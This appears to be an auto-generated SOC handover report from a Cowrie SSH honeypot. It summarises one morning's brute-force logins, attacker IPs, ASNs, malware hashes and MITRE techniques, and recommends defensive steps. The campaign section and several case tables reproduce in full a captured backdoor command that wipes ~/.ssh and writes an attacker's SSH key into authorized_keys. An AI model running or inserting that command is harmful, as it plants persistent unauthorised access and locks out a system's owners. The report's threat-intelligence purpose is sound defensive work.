# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-29 |
| **Generated At** | 2026-03-29T12:52:11Z |
| **Shift Time** | 12:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **61** |
| Confirmed Threats | **39** |
| False Positives Filtered | **22** (36.1%) |
| Unique Attacker IPs | **44** |
| Countries of Origin | **15** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **54** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **34** |
| Unique Credential Pairs | **30** |
| Unique Usernames | **19** |
| Unique Passwords | **27** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 8 |
| `345gs5662d34` | 3 |
| `Admin` | 3 |
| `unknown` | 2 |
| `Root` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `root` | 2 |
| `1q2w3e4r` | 2 |
| `webmaster` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `unknown` | `unknown2025` | 1 |
| `pi` | `password123` | 1 |
| `prueba` | `prueba` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Zz123456.` | `131.161.249.165` | 2026-03-29T10:56:29 |
| `root` | `3245gs5662d34` | `131.161.249.165` | 2026-03-29T10:56:37 |
| `root` | `3edcvgy7` | `43.166.156.13` | 2026-03-29T11:02:38 |
| `root` | `3245gs5662d34` | `43.166.156.13` | 2026-03-29T11:02:44 |
| `root` | `admin` | `100.19.147.208` | 2026-03-29T11:42:10 |
| `root` | `Admin04` | `185.196.10.248` | 2026-03-29T12:12:00 |
| `root` | `3245gs5662d34` | `185.196.10.248` | 2026-03-29T12:12:04 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.166.156.13`, `131.161.249.165`, `185.196.10.248`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **44** |
| Unique ASNs | **33** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 4 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS12389` | PJSC Rostelecom | 2 | HIGH |
| `AS264578` | B S COMÉRCIO E SERVIÇOS EM INFORMÁTICA LTDA - ME | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (7)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a2bc57433c29

| Field | Detail |
|---|---|
| **Source IP** | `131.161.249[.]165` |
| **First Seen** | 2026-03-29 10:56 |
| **Last Seen** | 2026-03-29 10:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 10:56:28` | `cowrie.session.connect` |
| `2026-03-29 10:56:28` | `cowrie.client.version` |
| `2026-03-29 10:56:28` | `cowrie.client.kex` |
| `2026-03-29 10:56:29` | `cowrie.login.success` |
| `2026-03-29 10:56:30` | `cowrie.session.params` |
| `2026-03-29 10:56:30` | `cowrie.command.input` |
| `2026-03-29 10:56:30` | `cowrie.command.failed` |
| `2026-03-29 10:56:31` | `cowrie.log.closed` |
| `2026-03-29 10:56:31` | `cowrie.session.params` |
| `2026-03-29 10:56:31` | `cowrie.command.input` |
| `2026-03-29 10:56:32` | `cowrie.session.file_download` |
| `2026-03-29 10:56:32` | `cowrie.log.closed` |
| `2026-03-29 10:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.161.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `131.161.249[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65f513f3aea7

| Field | Detail |
|---|---|
| **Source IP** | `131.161.249[.]165` |
| **First Seen** | 2026-03-29 10:56 |
| **Last Seen** | 2026-03-29 10:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 10:56:35` | `cowrie.session.connect` |
| `2026-03-29 10:56:35` | `cowrie.client.version` |
| `2026-03-29 10:56:36` | `cowrie.client.kex` |
| `2026-03-29 10:56:37` | `cowrie.login.success` |
| `2026-03-29 10:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.161.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `131.161.249[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f37b28e748eb

| Field | Detail |
|---|---|
| **Source IP** | `43.166.156[.]13` |
| **First Seen** | 2026-03-29 11:02 |
| **Last Seen** | 2026-03-29 11:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 11:02:37` | `cowrie.session.connect` |
| `2026-03-29 11:02:37` | `cowrie.client.version` |
| `2026-03-29 11:02:37` | `cowrie.client.kex` |
| `2026-03-29 11:02:38` | `cowrie.login.success` |
| `2026-03-29 11:02:39` | `cowrie.session.params` |
| `2026-03-29 11:02:39` | `cowrie.command.input` |
| `2026-03-29 11:02:39` | `cowrie.command.failed` |
| `2026-03-29 11:02:39` | `cowrie.log.closed` |
| `2026-03-29 11:02:40` | `cowrie.session.params` |
| `2026-03-29 11:02:40` | `cowrie.command.input` |
| `2026-03-29 11:02:40` | `cowrie.session.file_download` |
| `2026-03-29 11:02:40` | `cowrie.log.closed` |
| `2026-03-29 11:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.156[.]13` to AbuseIPDB if not already reported
- [ ] Block `43.166.156[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-719b03c6c6d5

| Field | Detail |
|---|---|
| **Source IP** | `43.166.156[.]13` |
| **First Seen** | 2026-03-29 11:02 |
| **Last Seen** | 2026-03-29 11:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 11:02:43` | `cowrie.session.connect` |
| `2026-03-29 11:02:43` | `cowrie.client.version` |
| `2026-03-29 11:02:43` | `cowrie.client.kex` |
| `2026-03-29 11:02:44` | `cowrie.login.success` |
| `2026-03-29 11:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.156[.]13` to AbuseIPDB if not already reported
- [ ] Block `43.166.156[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-603e752ae603

| Field | Detail |
|---|---|
| **Source IP** | `100.19.147[.]208` |
| **First Seen** | 2026-03-29 11:42 |
| **Last Seen** | 2026-03-29 11:44 |
| **Session Duration** | 122s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 11:42:06` | `cowrie.session.connect` |
| `2026-03-29 11:42:06` | `cowrie.client.version` |
| `2026-03-29 11:42:06` | `cowrie.client.kex` |
| `2026-03-29 11:42:08` | `cowrie.login.failed` |
| `2026-03-29 11:42:10` | `cowrie.login.success` |
| `2026-03-29 11:42:10` | `cowrie.session.params` |
| `2026-03-29 11:42:10` | `cowrie.command.input` |
| `2026-03-29 11:42:10` | `cowrie.command.failed` |
| `2026-03-29 11:42:10` | `cowrie.log.closed` |
| `2026-03-29 11:42:11` | `cowrie.session.params` |
| `2026-03-29 11:42:11` | `cowrie.command.input` |
| `2026-03-29 11:42:11` | `cowrie.log.closed` |
| `2026-03-29 11:42:12` | `cowrie.session.params` |
| `2026-03-29 11:42:12` | `cowrie.command.input` |
| `2026-03-29 11:42:12` | `cowrie.log.closed` |
| `2026-03-29 11:42:13` | `cowrie.session.params` |
| `2026-03-29 11:42:13` | `cowrie.command.input` |
| `2026-03-29 11:42:13` | `cowrie.log.closed` |
| `2026-03-29 11:42:13` | `cowrie.session.params` |
| `2026-03-29 11:42:13` | `cowrie.command.input` |
| `2026-03-29 11:42:14` | `cowrie.log.closed` |
| `2026-03-29 11:42:14` | `cowrie.session.params` |
| `2026-03-29 11:42:14` | `cowrie.command.input` |
| `2026-03-29 11:42:15` | `cowrie.log.closed` |
| `2026-03-29 11:42:15` | `cowrie.session.params` |
| `2026-03-29 11:42:15` | `cowrie.command.input` |
| `2026-03-29 11:42:15` | `cowrie.log.closed` |
| `2026-03-29 11:42:16` | `cowrie.session.params` |
| `2026-03-29 11:42:16` | `cowrie.command.input` |
| `2026-03-29 11:42:16` | `cowrie.log.closed` |
| `2026-03-29 11:42:17` | `cowrie.session.params` |
| `2026-03-29 11:42:17` | `cowrie.command.input` |
| `2026-03-29 11:42:17` | `cowrie.log.closed` |
| `2026-03-29 11:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.19.147[.]208` to AbuseIPDB if not already reported
- [ ] Block `100.19.147[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a84ed20b163f

| Field | Detail |
|---|---|
| **Source IP** | `185.196.10[.]248` |
| **First Seen** | 2026-03-29 12:11 |
| **Last Seen** | 2026-03-29 12:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 12:11:59` | `cowrie.session.connect` |
| `2026-03-29 12:11:59` | `cowrie.client.version` |
| `2026-03-29 12:12:00` | `cowrie.client.kex` |
| `2026-03-29 12:12:00` | `cowrie.login.success` |
| `2026-03-29 12:12:00` | `cowrie.session.params` |
| `2026-03-29 12:12:00` | `cowrie.command.input` |
| `2026-03-29 12:12:00` | `cowrie.command.failed` |
| `2026-03-29 12:12:01` | `cowrie.log.closed` |
| `2026-03-29 12:12:01` | `cowrie.session.params` |
| `2026-03-29 12:12:01` | `cowrie.command.input` |
| `2026-03-29 12:12:01` | `cowrie.session.file_download` |
| `2026-03-29 12:12:01` | `cowrie.log.closed` |
| `2026-03-29 12:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.196.10[.]248` to AbuseIPDB if not already reported
- [ ] Block `185.196.10[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11b81d175ff3

| Field | Detail |
|---|---|
| **Source IP** | `185.196.10[.]248` |
| **First Seen** | 2026-03-29 12:12 |
| **Last Seen** | 2026-03-29 12:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 12:12:03` | `cowrie.session.connect` |
| `2026-03-29 12:12:03` | `cowrie.client.version` |
| `2026-03-29 12:12:03` | `cowrie.client.kex` |
| `2026-03-29 12:12:04` | `cowrie.login.success` |
| `2026-03-29 12:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.196.10[.]248` to AbuseIPDB if not already reported
- [ ] Block `185.196.10[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `20.119.86[.]71` | **2** | 2026-03-29 12:40 | 2026-03-29 12:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.52.130[.]122` | 1 | 2026-03-29 12:13 | 2026-03-29 12:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.26.99[.]93` | 1 | 2026-03-29 12:24 | 2026-03-29 12:25 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.30.7[.]45` | 1 | 2026-03-29 12:10 | 2026-03-29 12:11 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.113.241[.]82` | 1 | 2026-03-29 10:55 | 2026-03-29 10:55 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.163.178[.]146` | 1 | 2026-03-29 12:32 | 2026-03-29 12:32 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.198.138[.]185` | 1 | 2026-03-29 12:29 | 2026-03-29 12:29 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.39[.]73` | 1 | 2026-03-29 12:13 | 2026-03-29 12:13 | 7s | 0 | `T1592` | 🟢 LOW |
| `125.215.199[.]37` | 1 | 2026-03-29 11:14 | 2026-03-29 11:14 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `131.161.249[.]165` | 1 | 2026-03-29 10:56 | 2026-03-29 10:56 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `138.36.127[.]80` | 1 | 2026-03-29 11:25 | 2026-03-29 11:25 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `166.1.144[.]62` | 1 | 2026-03-29 12:24 | 2026-03-29 12:24 | 8s | 1 | `T1110.001` | 🟢 LOW |
| `182.139.39[.]150` | 1 | 2026-03-29 12:44 | 2026-03-29 12:44 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.196.10[.]248` | 1 | 2026-03-29 12:12 | 2026-03-29 12:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.88.75[.]74` | 1 | 2026-03-29 12:04 | 2026-03-29 12:05 | 30s | 0 | `T1592` | 🟢 LOW |
| `223.197.153[.]143` | 1 | 2026-03-29 12:12 | 2026-03-29 12:12 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.241.214[.]127` | 1 | 2026-03-29 10:32 | 2026-03-29 10:32 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.223.98[.]117` | 1 | 2026-03-29 10:37 | 2026-03-29 10:37 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `37.238.41[.]95` | 1 | 2026-03-29 11:52 | 2026-03-29 11:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.166.156[.]13` | 1 | 2026-03-29 11:02 | 2026-03-29 11:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.150[.]248` | 1 | 2026-03-29 11:05 | 2026-03-29 11:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.151[.]40` | 1 | 2026-03-29 12:12 | 2026-03-29 12:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]5` | 1 | 2026-03-29 11:13 | 2026-03-29 11:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.189.169[.]178` | 1 | 2026-03-29 12:04 | 2026-03-29 12:04 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.49.113[.]138` | 1 | 2026-03-29 11:32 | 2026-03-29 11:32 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.172.1[.]210` | 1 | 2026-03-29 12:48 | 2026-03-29 12:48 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.192.226[.]83` | 1 | 2026-03-29 11:32 | 2026-03-29 11:32 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `67.85.146[.]216` | 1 | 2026-03-29 11:45 | 2026-03-29 11:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `75.80.65[.]214` | 1 | 2026-03-29 11:52 | 2026-03-29 11:52 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.211.154[.]253` | 1 | 2026-03-29 10:30 | 2026-03-29 10:30 | 8s | 0 | `T1592` | 🟢 LOW |
| `8.220.132[.]38` | 1 | 2026-03-29 11:33 | 2026-03-29 11:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.26.99[.]93` | CN | China Mobile Communications Corporation | **100** ⚠️ | 20 |
| `100.19.147[.]208` | US | Verizon Business | **100** ⚠️ | 0 |
| `8.220.132[.]38` | PH | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 2 |
| `125.215.199[.]37` | HK | C S (HK) CO LIMITED | **100** ⚠️ | 50 |
| `112.30.7[.]45` | CN | China Mobile Communications Corporation | **100** ⚠️ | 42 |
| `138.36.127[.]80` | BR | B S COMÉRCIO E SERVIÇOS EM INFORMÁTICA LTDA - ME | **100** ⚠️ | 12 |
| `62.192.226[.]83` | RU | Arkhangelsk Television Company | **100** ⚠️ | 50 |
| `223.197.153[.]143` | HK | HKT Limited | **100** ⚠️ | 50 |
| `67.85.146[.]216` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 11 |
| `116.113.241[.]82` | CN | InnerMongoliaAlashanZXHB52MH01huawei3 | **100** ⚠️ | 23 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 46 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 27 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 61 cases |
| Tool 34  | Credential Extractor        | ✅ 34 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 44 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (36.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 33 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 7 priority case(s) shown individually · 31 recon entry/entries in table (1 group(s) consolidating 2 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-29T12:52:11Z_
